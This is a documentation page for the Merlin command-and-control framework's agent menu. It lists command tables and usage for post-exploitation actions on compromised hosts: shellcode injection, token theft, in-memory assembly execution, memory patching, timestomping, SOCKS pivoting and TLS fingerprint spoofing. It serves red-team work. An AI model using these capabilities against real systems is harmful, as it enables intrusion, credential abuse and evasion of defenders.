<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Agent Menu &mdash; Merlin BETA documentation</title>
      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../../_static/jquery.js?v=5d32c60e"></script>
        <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../../_static/documentation_options.js?v=850acc4c"></script>
        <script src="../../_static/doctools.js?v=888ff710"></script>
        <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Listener Menu" href="listeners.html" />
    <link rel="prev" title="Main Menu" href="main.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../../index.html" class="icon icon-home">
            Merlin
          </a>
              <div class="version">
                0.8.0
              </div>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">FAQ</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../faq/faq.html">FAQ</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Quick Start</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../quickStart/quickstart.html">Quick Start</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin Agent</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../agent/cli.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../agent/dll.html">DLL Agent</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../agent/custom.html">Custom Build</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin CLI</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../faq.html">FAQ</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../tls.html">TLS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../listeners.html">Listeners</a></li>
<li class="toctree-l1"><a class="reference internal" href="../commands.html">Command Interface</a></li>
<li class="toctree-l1"><a class="reference internal" href="../logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="main.html">Main Menu</a></li>
<li class="toctree-l1 current"><a class="current reference internal" href="#">Agent Menu</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#help">help</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#core">core</a></li>
<li class="toctree-l3"><a class="reference internal" href="#linux">linux</a></li>
<li class="toctree-l3"><a class="reference internal" href="#windows">windows</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#id1">!</a></li>
<li class="toctree-l2"><a class="reference internal" href="#back">back</a></li>
<li class="toctree-l2"><a class="reference internal" href="#banner">banner</a></li>
<li class="toctree-l2"><a class="reference internal" href="#cd">cd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#checkin">checkin</a></li>
<li class="toctree-l2"><a class="reference internal" href="#clear">clear</a></li>
<li class="toctree-l2"><a class="reference internal" href="#connect">connect</a></li>
<li class="toctree-l2"><a class="reference internal" href="#debug">debug</a></li>
<li class="toctree-l2"><a class="reference internal" href="#download">download</a></li>
<li class="toctree-l2"><a class="reference internal" href="#env">env</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#get">get</a></li>
<li class="toctree-l3"><a class="reference internal" href="#set">set</a></li>
<li class="toctree-l3"><a class="reference internal" href="#showall">showall</a></li>
<li class="toctree-l3"><a class="reference internal" href="#unset">unset</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#exit">exit</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-assembly">execute-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-pe">execute-pe</a></li>
<li class="toctree-l2"><a class="reference internal" href="#execute-shellcode">execute-shellcode</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#self">self</a></li>
<li class="toctree-l3"><a class="reference internal" href="#remote">remote</a></li>
<li class="toctree-l3"><a class="reference internal" href="#rtlcreateuserthread">RtlCreateUserThread</a></li>
<li class="toctree-l3"><a class="reference internal" href="#userapc">UserAPC</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#ifconfig">ifconfig</a></li>
<li class="toctree-l2"><a class="reference internal" href="#info">info</a></li>
<li class="toctree-l2"><a class="reference internal" href="#interact">interact</a></li>
<li class="toctree-l2"><a class="reference internal" href="#invoke-assembly">invoke-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#ipconfig">ipconfig</a></li>
<li class="toctree-l2"><a class="reference internal" href="#ja3">ja3</a></li>
<li class="toctree-l2"><a class="reference internal" href="#jobs">jobs</a></li>
<li class="toctree-l2"><a class="reference internal" href="#kill">kill</a></li>
<li class="toctree-l2"><a class="reference internal" href="#killdate">killdate</a></li>
<li class="toctree-l2"><a class="reference internal" href="#link">link</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#add">add</a></li>
<li class="toctree-l3"><a class="reference internal" href="#list">list</a></li>
<li class="toctree-l3"><a class="reference internal" href="#remove">remove</a></li>
<li class="toctree-l3"><a class="reference internal" href="#refresh">refresh</a></li>
<li class="toctree-l3"><a class="reference internal" href="#smb">smb</a></li>
<li class="toctree-l3"><a class="reference internal" href="#tcp">tcp</a></li>
<li class="toctree-l3"><a class="reference internal" href="#udp">udp</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#listener">listener</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#listener-list">list</a></li>
<li class="toctree-l3"><a class="reference internal" href="#start">start</a></li>
<li class="toctree-l3"><a class="reference internal" href="#stop">stop</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#listeners">listeners</a></li>
<li class="toctree-l2"><a class="reference internal" href="#list-assemblies">list-assemblies</a></li>
<li class="toctree-l2"><a class="reference internal" href="#load-assembly">load-assembly</a></li>
<li class="toctree-l2"><a class="reference internal" href="#load-clr">load-clr</a></li>
<li class="toctree-l2"><a class="reference internal" href="#ls">ls</a></li>
<li class="toctree-l2"><a class="reference internal" href="#main">main</a></li>
<li class="toctree-l2"><a class="reference internal" href="#make-token">make_token</a></li>
<li class="toctree-l2"><a class="reference internal" href="#maxretry">maxretry</a></li>
<li class="toctree-l2"><a class="reference internal" href="#memfd">memfd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#memory">memory</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#patch">patch</a></li>
<li class="toctree-l3"><a class="reference internal" href="#read">read</a></li>
<li class="toctree-l3"><a class="reference internal" href="#write">write</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#modules">modules</a></li>
<li class="toctree-l2"><a class="reference internal" href="#netstat">netstat</a></li>
<li class="toctree-l2"><a class="reference internal" href="#note">note</a></li>
<li class="toctree-l2"><a class="reference internal" href="#nslookup">nslookup</a></li>
<li class="toctree-l2"><a class="reference internal" href="#padding">padding</a></li>
<li class="toctree-l2"><a class="reference internal" href="#parrot">parrot</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pipes">pipes</a></li>
<li class="toctree-l2"><a class="reference internal" href="#printenv">printenv</a></li>
<li class="toctree-l2"><a class="reference internal" href="#ps">ps</a></li>
<li class="toctree-l2"><a class="reference internal" href="#pwd">pwd</a></li>
<li class="toctree-l2"><a class="reference internal" href="#quit">quit</a></li>
<li class="toctree-l2"><a class="reference internal" href="#rev2self">rev2self</a></li>
<li class="toctree-l2"><a class="reference internal" href="#rm">rm</a></li>
<li class="toctree-l2"><a class="reference internal" href="#runas">runas</a></li>
<li class="toctree-l2"><a class="reference internal" href="#run">run</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#shell-functions">Shell Functions</a></li>
<li class="toctree-l3"><a class="reference internal" href="#quoted-arguments">Quoted Arguments</a></li>
<li class="toctree-l3"><a class="reference internal" href="#escape-sequence">Escape Sequence</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#sdelete">sdelete</a></li>
<li class="toctree-l2"><a class="reference internal" href="#sessions">sessions</a></li>
<li class="toctree-l2"><a class="reference internal" href="#sharpgen">sharpgen</a></li>
<li class="toctree-l2"><a class="reference internal" href="#shell">shell</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id27">Shell Functions</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id28">Quoted Arguments</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id29">Escape Sequence</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#skew">skew</a></li>
<li class="toctree-l2"><a class="reference internal" href="#sleep">sleep</a></li>
<li class="toctree-l2"><a class="reference internal" href="#socks">socks</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#socks-list">list</a></li>
<li class="toctree-l3"><a class="reference internal" href="#socks-start">start</a></li>
<li class="toctree-l3"><a class="reference internal" href="#socks-stop">stop</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#ssh">ssh</a></li>
<li class="toctree-l2"><a class="reference internal" href="#status">status</a></li>
<li class="toctree-l2"><a class="reference internal" href="#steal-token">steal_token</a></li>
<li class="toctree-l2"><a class="reference internal" href="#token">token</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#make">make</a></li>
<li class="toctree-l3"><a class="reference internal" href="#privs">privs</a></li>
<li class="toctree-l3"><a class="reference internal" href="#token-rev2self">rev2self</a></li>
<li class="toctree-l3"><a class="reference internal" href="#steal">steal</a></li>
<li class="toctree-l3"><a class="reference internal" href="#whoami">whoami</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#touch">touch</a></li>
<li class="toctree-l2"><a class="reference internal" href="#unlink">unlink</a></li>
<li class="toctree-l2"><a class="reference internal" href="#upload">upload</a></li>
<li class="toctree-l2"><a class="reference internal" href="#uptime">uptime</a></li>
<li class="toctree-l2"><a class="reference internal" href="#verbose">verbose</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="listeners.html">Listener Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="modules.html">Modules Menu</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin Server</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../server/server.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../server/logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../server/x509.html">TLS Certificates</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Modules</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../modules/build.html">Building Modules</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Misc.</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../misc/blogs.html">Blog Posts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../misc/contrib.html">Contributing</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Merlin</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Agent Menu</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/cli/menu/agents.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="agent-menu">
<h1>Agent Menu<a class="headerlink" href="#agent-menu" title="Link to this heading"></a></h1>
<p>The agent menu context is used to interact with a single agent. The Merlin prompt will include the word <code class="docutils literal notranslate"><span class="pre">agent</span></code> along
with the identifier for the selected agent. Type <code class="docutils literal notranslate"><span class="pre">help</span></code> to see a list of available commands for the agent menu context.</p>
<p>Prefix any command with <code class="docutils literal notranslate"><span class="pre">help</span></code> (e.g., <code class="docutils literal notranslate"><span class="pre">help</span> <span class="pre">run</span></code>) to view the command’s help information.
Use any of the following flags after a command name to view the help information for that command:
<code class="docutils literal notranslate"><span class="pre">help</span></code>, <code class="docutils literal notranslate"><span class="pre">-h</span></code>, <code class="docutils literal notranslate"><span class="pre">--help</span></code>, <code class="docutils literal notranslate"><span class="pre">?</span></code>, <code class="docutils literal notranslate"><span class="pre">/?</span></code></p>
<section id="help">
<h2>help<a class="headerlink" href="#help" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>The help menu will only show commands available to agent depending on its operating system</p>
</div>
<ul class="simple">
<li><p><a class="reference internal" href="#help-core"><span class="std std-ref">core</span></a></p></li>
<li><p><a class="reference internal" href="#linux">linux</a></p></li>
<li><p><a class="reference internal" href="#help-windows"><span class="std std-ref">windows</span></a></p></li>
</ul>
<section id="core">
<span id="help-core"></span><h3>core<a class="headerlink" href="#core" title="Link to this heading"></a></h3>
<p>The <code class="docutils literal notranslate"><span class="pre">core</span></code> commands are available to every agent regardless of which operating system they are running on</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» help

   COMMAND  |          DESCRIPTION           |                 USAGE
------------+--------------------------------+----------------------------------------
  !         | Execute a command on the local | ! command [args]
            | system                         |
  back      | Go to the main menu            | back
  banner    | Display the Merlin ASCII art   | banner
            | banner                         |
  cd        | Change the Agent&#39;s current     | cd directory
            | working directory to provided  |
            | file system path               |
  checkin   | Force the agent check in by    | checkin
            | sending back an AgentInfo      |
            | message                        |
  clear     | Cancel all Agent jobs that     | clear
            | have not been sent             |
  connect   | Instruct an Agent to           | connect uri
            | re-connect it&#39;s primary        |
            | communicate channel to the     |
            | provide address                |
  debug     | Switch debug output to the     | debug
            | console on or off              |
  download  | Download a file from the host  | download filePath
            | the Agent is running on to the |
            | Server                         |
  env       | View or modify operating       | env {get|set|showall|unset}
            | system environment variables   | [variable] [value]
  exit      | Instruct the Agent to exit and | exit [-y]
            | quit running                   |
  ifconfig  | Get the network interface      | ifconfig
            | information where the Agent is |
            | running                        |
  info      | Display information about the  | info
            | Agent                          |
  interact  | Interact with an agent or a    | interact {agentID|listenerID}
            | listener                       |
  ipconfig  | Get the network interface      | ipconfig
            | information where the Agent is |
            | running                        |
  ja3       | Change the Agent&#39;s JA3 TLS     | ja3 signature
            | signature to the one provided  |
  jobs      | Display all unfinished jobs    | jobs
  kill      | Terminate a running process    | kill pid
            | by its numerical process       |
            | identifier                     |
  killdate  | Set the epoch date/time the    | killdate epochDateTime
            | agent will quit running        |
  link      | Establish a connection link    | link
            | with a peer-to-peer Agent      | {add|list|remove|refresh|tcp|udp|smb}
            |                                | address
  listener  | Start, stop, or list           | listener {list|start|stop}
            | peer-to-peer listeners on the  | [protocol] [address]
            | Agent                          |
  listeners | Move to the listeners menu     | listeners
  ls        | List the files and folders of  | ls [filePath]
            | the provided filepath          |
  main      | Go to the Main menu            | main
  maxretry  | Change the maximum number of   | maxretry number
            | failed connection attempts     |
            | before the Agent exits.        |
  modules   | Move to the modules menu       | modules
  note      | Create a server-side note for  | note message
            | the current agent.             |
  nslookup  | Natively resolve a hostname or | nslookup {hostname|ip address}
            | IP address                     | [hostname|ip address] ...
  padding   | Set the MAXIMUM amount of      | padding size
            | random message padding         |
  parrot    | Change the HTTP TLS            | parrot browserString
            | configuration to match         |
            | (parrot) the provided browser  |
  printenv  | List all environment           | printenv
            | variables.                     |
  pwd       | Print the current working      | pwd
            | directory.                     |
  quit      | Stop and exit Merlin           | quit [-y]
  rm        | Remove a file or directory     | rm filePath
  run       | Execute a program and return   | run program [arguments]
            | output                         |
  sdelete   | Securely delete a file by      | sdelete filePath
            | zeroing out the data           |
  sessions  | List established Agent         | sessions
            | sessions                       |
  shell     | Execute commands through the   | shell command [arguments]
            | host&#39;s default command shell   |
  skew      | Change the jitter, or skew,    | skew amount
            | of the Agent&#39;s beaconing       |
            | interval.                      |
  sleep     | Change the Agent&#39;s sleep       | sleep duration
            | interval                       |
  socks     | Start, stop, or list a SOCKS5  | socks {list | start
            | server on the Merlin server    | [interface:]port agentID |stop
            |                                | [interface:]port agentID}
  ssh       | Execute a command on a remote  | ssh username password
            | host via SSH                   | host:port program [args]
  status    | Display if the Agent is        | status
            | active, delayed, or dead       |
  touch     | Copy a file&#39;s timestamp to     | touch sourceFilePath
            | another file                   | destinationFilePath
  unlink    | Task parent Agent to           | unlink childAgentID
            | disconnect the child           |
            | peer-to-peer Agent             |
  upload    | Upload a file to the target    | upload sourceFilePath
            | system                         | destinationFilePath
  verbose   | Switch verbose output to the   | verbose
            | console on or off              |
</pre></div>
</div>
</section>
<section id="linux">
<span id="help-linux"></span><h3>linux<a class="headerlink" href="#linux" title="Link to this heading"></a></h3>
<p>These commands are only available to agents running on a <code class="docutils literal notranslate"><span class="pre">Linux</span></code> operating system.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>   COMMAND  |          DESCRIPTION           |                 USAGE
------------+--------------------------------+----------------------------------------
  memfd     | Execute a program from memory  | memfd filePath [args]
</pre></div>
</div>
</section>
<section id="windows">
<span id="help-windows"></span><h3>windows<a class="headerlink" href="#windows" title="Link to this heading"></a></h3>
<p>These commands are only available to agents running on a <code class="docutils literal notranslate"><span class="pre">Windows</span></code> operating system.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>       COMMAND      |          DESCRIPTION           |                   USAGE
--------------------+--------------------------------+--------------------------------------------
  execute-assembly  | Execute .NET assembly as       | execute-assembly assemblyPath
                    | shellcode in a child process   | [assemblyArguments]
                    |                                | [spawnToPath]
                    |                                | [spawnToArguments]
  execute-pe        | Execute Windows PE as          | execute-pe peFilePath
                    | shellcode in a child process   | [peArgumentes] [spawnToPath]
                    |                                | [spawnToArguments]
  execute-shellcode | Execute Windows shellcode      | execute-shellcode
                    |                                | {self|remote|RtlCreateUserThread|UserAPC}
                    |                                | [PID] {shellcode | shellcodeFilePath}
  invoke-assembly   | Execute a .NET assembly that   | invoke-assembly assemblyName
                    | was previously loaded into the | [assemblyArguments]
                    | agent with the &#39;load-assembly&#39; |
                    | command.                       |
  load-clr          | Load a specific version of the | load-clr VERSION
                    | .NET CLR                       |
  list-assemblies   | Lists .NET assemblies that     | list-assemblies
                    | have been loaded into the      |
                    | agent’s process with the       |
                    | &#39;load-assembly&#39; command.       |
  load-assembly     | Load a .NET assembly into the  | load-assembly filePath [alias]
                    | agent’s process.               |
  make_token        | Create a new Windows access    | make_token DOMAIN\USERNAME
                    | token                          | PASSWORD
  memory            | Read, write, or patch the      | memory {read|write|patch}
                    | Agent process&#39; virtual memory  | module procedure {readLength |
                    |                                | hexData}
  netstat           | Get a list of network          | netstat [-p tcp|udp]
                    | connections                    |
  pipes             | List all named pipes on the    | pipes
                    | system                         |
  ps                | List running processes         | ps
  rev2self          | Revert the thread              | rev2self
                    | impersonation token to the     |
                    | process token                  |
  runas             | Run a program as a different   | runas domain\user password
                    | user.                          | program [arguments]
  sharpgen          | Compile &amp; execute arbitrary C# | sharpgen &lt;C# code&gt; [spawnto]
                    | code.                          | [spawnto_args]
  steal_token       | Steal and use a Windows access | steal_token PID
                    | token from another process     |
  token             | Interact with Windows access   | token
                    | tokens                         | {make|privs|rev2self|steal|whoami}
                    |                                | [options]
  uptime            | Get the uptime of the target   | uptime
                    | system.                        |
</pre></div>
</div>
</section>
</section>
<section id="id1">
<h2>!<a class="headerlink" href="#id1" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">!</span> <span class="pre">command</span> <span class="pre">[args]</span></code></p>
</div>
<p>Any command that begins with a <code class="docutils literal notranslate"><span class="pre">!</span></code> (a.k.a bang or exclamation point) will be executed on host itself where the Merlin
server is running. This is useful when you want simple information, such as your interface address, without having to
open a new terminal.</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>There must be a space after the <code class="docutils literal notranslate"><span class="pre">!</span></code> for the command to be executed.</p>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin» ! ip a show ens32

[i] Executing system command...

[+] 2: ens32: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:0c:29:z3:ff:91 brd ff:ff:ff:ff:ff:ff
    inet 192.168.211.221/24 brd 192.168.211.255 scope global dynamic noprefixroute ens32
       valid_lft 1227sec preferred_lft 1227sec
    inet6 fe80::a71d:1f6a:a0d1:7985/64 scope link noprefixroute
       valid_lft forever preferred_lft forever

Merlin»
</pre></div>
</div>
</section>
<section id="back">
<h2>back<a class="headerlink" href="#back" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">back</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">back</span></code> command go to the parent menu, typically the main menu. When the <code class="docutils literal notranslate"><span class="pre">back</span></code> command is executed from the
main menu, nothing will happen.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin» back
Merlin»
</pre></div>
</div>
</section>
<section id="banner">
<h2>banner<a class="headerlink" href="#banner" title="Link to this heading"></a></h2>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>USAGE: <code class="docutils literal notranslate"><span class="pre">banner</span></code></p>
</div>
<p>The <code class="docutils literal notranslate"><span class="pre">banner</span></code> command is used too print the super cool ascii art banner along with the version and build numbers.</p>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin» banner
Merlin»


                               &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                             &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                            &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                          &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; &amp;&amp;&amp;&amp;
                         &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;
                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp; &amp;  &amp;&amp;&amp;&amp;
                       &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;&amp;
                      &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;
                     &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;
                    &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;
                   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                 &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
                &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
               &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
              &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
             &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
       &amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;&amp;&amp;
    &amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;
  &amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;&amp;&amp;&amp;&amp;&amp;&amp;
&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;     &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;          MERLIN         &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
    &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
       &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
